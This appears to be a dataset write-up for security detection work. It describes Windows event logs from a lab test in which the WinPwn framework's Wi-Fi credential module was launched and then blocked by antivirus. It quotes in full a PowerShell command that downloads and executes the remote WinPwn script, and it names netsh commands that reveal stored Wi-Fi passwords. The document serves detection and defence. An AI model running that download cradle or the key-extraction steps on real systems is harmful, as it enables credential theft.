# T1555-7: Credentials from Password Stores — WinPwn - Loot Local Credentials - Wifi Credentials

## Technique Context

T1555 covers credential theft from password stores. This test uses the WinPwn framework to run its `wificreds` function, which extracts Wi-Fi pre-shared keys stored by the Windows WLAN AutoConfig service. Windows stores Wi-Fi profiles and their passwords in XML files under `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\`. The WinPwn `wificreds` module typically uses `netsh wlan show profiles` and `netsh wlan show profile name="<SSID>" key=clear` to extract plaintext PSKs without requiring any third-party binary. Wi-Fi credential theft is relevant in environments where an attacker has compromised a workstation but wants to pivot to other network segments or capture credentials that may be reused elsewhere.

## What This Dataset Contains

The dataset spans approximately 8 seconds (2026-03-14T00:38:40Z – 00:38:48Z) on ACME-WS02.

**The attack command is visible in Security EID 4688 and PowerShell EID 4104:**

> `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
> `wificreds -consoleoutput -noninteractive}`

This is the same WinPwn URL and commit hash as T1555-6, with `wificreds` replacing `lazagnemodule`. Sysmon EID 22 records the DNS query for `raw.githubusercontent.com`, and PowerShell EID 4103 records `New-Object` with `TypeName=net.webclient`.

**Windows Defender blocked the script.** PowerShell EID 4100:

> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

The outcome is identical to T1555-6: WinPwn.ps1 was downloaded, AMSI scanned and blocked it at the `iex()` evaluation point, and the `wificreds` function never executed.

The Sysmon and Security event structure mirrors T1555-6 exactly: EID 1 for `whoami.exe` and PowerShell, EID 7 for DLL loads, EID 17 for pipe creation, EID 22 for DNS, Security EID 4688/4689/4703 for process lifecycle. There is no Sysmon EID 3 (network connection) in this dataset's sysmon.jsonl.

## What This Dataset Does Not Contain (and Why)

**Wi-Fi profile enumeration or PSK extraction.** AMSI blocked WinPwn before `wificreds` ran. No `netsh.exe` child processes, no reads of `C:\ProgramData\Microsoft\Wlansvc\Profiles`, and no WLAN API calls are present.

**Differentiation from T1555-6 in telemetry structure.** The only forensic difference between T1555-6 and T1555-7 is the function name (`lazagnemodule` vs `wificreds`) in the command line and scriptblock. The download URL, AMSI block pattern, DNS query, and process lifecycle events are identical. Detection rules that fire on the WinPwn URL will cover both tests; differentiation of the specific module requires parsing the function name argument.

**Wi-Fi profile data.** Even if execution had succeeded, ACME-WS02 is a Proxmox VM with no physical wireless hardware. There are no Wi-Fi profiles on this machine; the `wificreds` module would have returned an empty result set.

## Assessment

This dataset is structurally identical to T1555-6 with the module name changed from `lazagnemodule` to `wificreds`. It demonstrates the WinPwn framework's modular design — the same download cradle and AMSI block fingerprint appear regardless of which credential target is selected. The primary unique value is the `wificreds` function name in the command line, which, combined with T1555-6 and T1555-8 events, illustrates the pattern of an attacker systematically cycling through WinPwn modules to maximize credential harvest coverage.

## Detection Opportunities Present in This Data

- **Security EID 4688**: Command line contains `wificreds -consoleoutput -noninteractive` and the WinPwn GitHub URL. The `wificreds` string is a direct indicator of Wi-Fi credential targeting.
- **PowerShell EID 4104**: Scriptblock captures `{iex(...WinPwn.ps1') wificreds -consoleoutput -noninteractive}`. Function name is directly present.
- **PowerShell EID 4103**: `New-Object TypeName=net.webclient` — same download cradle as T1555-6. This module invocation precedes all WinPwn-family attacks in this environment.
- **PowerShell EID 4100**: `ScriptContainedMaliciousContent,InvokeExpressionCommand` — AMSI block fingerprint, identical to T1555-6.
- **Sysmon EID 22**: DNS query for `raw.githubusercontent.com` from PowerShell.
- **Cross-dataset pattern**: WinPwn tests T1555-6 (lazagnemodule), T1555-7 (wificreds), and T1555-8 (decryptteamviewer) execute within 60 seconds on the same host. The repeated download of the same WinPwn URL across multiple sessions within a short window is a high-confidence indicator of automated credential harvesting across multiple target categories.
